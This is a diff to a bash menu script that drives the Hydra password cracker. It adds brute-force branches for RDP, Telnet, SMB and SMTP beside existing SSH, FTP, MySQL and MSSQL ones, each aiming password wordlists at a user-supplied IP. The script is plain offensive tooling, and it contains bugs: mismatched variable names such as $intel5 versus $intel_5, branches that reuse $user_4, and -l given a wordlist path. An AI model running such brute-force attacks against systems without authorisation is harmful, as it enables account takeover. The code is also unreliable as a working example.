@@ -32,9 +32,7 @@ case $choice in
    read -p "Users wordlist location: " user_loc 
    hydra -l $user_loc -P $wordl ssh://$ip
    fi
-
     ;;
-
   2)
     echo  "FTP Bruteforce"
 read -p "Do you know the user(y=1/n=0): " intel_2
@@ -47,9 +45,7 @@ read -p "Do you know the user(y=1/n=0): " intel_2
   read -p "Users wordlist location: " user_loc2 
   hydra -l $user_loc2 -P $wordl ftp://$ip
   fi  
-
     ;;
-
   3)
     echo "MYSQL Bruteforce"
 read -p "Do you know the user(y=1/n=0): " intel_3
@@ -63,7 +59,6 @@ read -p "Do you know the user(y=1/n=0): " intel_3
   hydra -l $user_loc3 -P $wordl mysql://$ip
   fi  
     ;;
-
   4)
  echo "MSSQL BruteForce"
 read -p "Do you know the user(y=1/n=0): " intel_4
@@ -76,24 +71,60 @@ read -p "Do you know the user(y=1/n=0): " intel_4
   read -p "Users wordlist location: " user_loc4 
   hydra -l $user_loc4 -P $wordl mssql://$ip
   fi  
-
     ;;
-
-
 5)
+ echo "RDP BruteForce"
+read -p "Do you know the user(y=1/n=0): " intel_5
+ if [ "$intel5" -eq 1 ]
+  then
+  read -p "User: " user_5
+  hydra -l $user_5 -P $wordl rdp://$ip
+ elif [ "$intel_5" -eq 0 ]
+  then
+  read -p "Users wordlist location: " user_loc5 
+  hydra -l $user_loc5 -P $wordl rdp://$ip
+fi
 ;;
-
 6)
+ echo "TELNET BruteForce"
+read -p "Do you know the user(y=1/n=0): " intel_6
+ if [ "$intel6" -eq 1 ]
+  then
+  read -p "User: " user_6
+  hydra -l $user_4 -P $wordl telnet://$ip
+ elif [ "$intel_6" -eq 0 ]
+  then
+  read -p "Users wordlist location: " user_loc6 
+  hydra -l $user_loc4 -P $wordl telnet://$ip
+fi
 ;;
-
 7)
+ echo "SMB BruteForce"
+read -p "Do you know the user(y=1/n=0): " intel_7
+ if [ "$intel7" -eq 1 ]
+  then
+  read -p "User: " user_7
+  hydra -l $user_7 -P $wordl smb://$ip
+ elif [ "$intel_7" -eq 0 ]
+  then
+  read -p "Users wordlist location: " user_loc7 
+  hydra -l $user_loc7 -P $wordl smb://$ip
+fi
 ;;
 
 8)
+ echo "SMTP BruteForce"
+read -p "Do you know the user(y=1/n=0): " intel_8
+ if [ "$intel8" -eq 1 ]
+  then
+  read -p "User: " user_8
+  hydra -l $user_4 -P $wordl smtp://$ip
+ elif [ "$intel_8" -eq 0 ]
+  then
+  read -p "Users wordlist location: " user_loc8 
+  hydra -l $user_loc8 -P $wordl smtp://$ip
+fi
 ;;
-
-
-
 esac
  else
 sudo apt update 
